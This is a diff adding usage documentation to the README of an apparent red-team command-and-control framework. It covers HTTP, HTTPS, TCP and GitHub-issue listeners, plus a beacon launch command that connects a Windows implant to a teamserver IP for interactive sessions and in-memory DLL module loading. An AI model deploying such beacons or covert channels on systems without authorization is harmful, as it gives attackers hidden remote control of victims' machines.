@@ -31,6 +31,17 @@ It's launched using 'python3 GUI.py'
 python3 GUI.py
 ```
 
+## TeamServer Listeners
+
+4 types of listeners are available from the TeamServer: HTTP, HTTPS that start a web server on the given port, TCP that start a TCP server on the given port and GitHub that use GitHub issues from a project like "maxDcb/C2TeamServer" and a personal access token (with issues write rights).
+
+![alt text](https://github.com/maxDcb/C2TeamServer/blob/master/images/AddListener.png?raw=true)
+
+![alt text](https://github.com/maxDcb/C2TeamServer/blob/master/images/AddListenerTypes.png?raw=true)
+
+![alt text](https://github.com/maxDcb/C2TeamServer/blob/master/images/Listeners.png?raw=true)
+
+
 ## Beacons
 
 ### Windows Beacon
@@ -38,6 +49,16 @@ python3 GUI.py
 Winodws Beacons and command modules are compiled separately in another [project](https://github.com/maxDcb/C2Implant), but a compiled version is provided in ./Release/Beacons and ./Release/Modules to be able to use it directly.
 
 ![alt text](https://github.com/maxDcb/C2TeamServer/blob/master/images/ReleaseModulesBeacons.png?raw=true)
+
+```
+.\BeaconHttp.exe 10.10.52.5 8443 https
+```
+
+When the Beacon is started and connect to the TeamServer, a new session is started from where you can interact with the Beacon:
+
+![alt text](https://github.com/maxDcb/C2TeamServer/blob/master/images/NewSession.png?raw=true)
+
+![alt text](https://github.com/maxDcb/C2TeamServer/blob/master/images/SessionInteract.png?raw=true)
 
 Windows beacon uses primarily windows API and start with no module loaded. Modules are loaded at runtime using "MemoryModule" project to load DLL sent by the TeamServer to the beacon.  
 
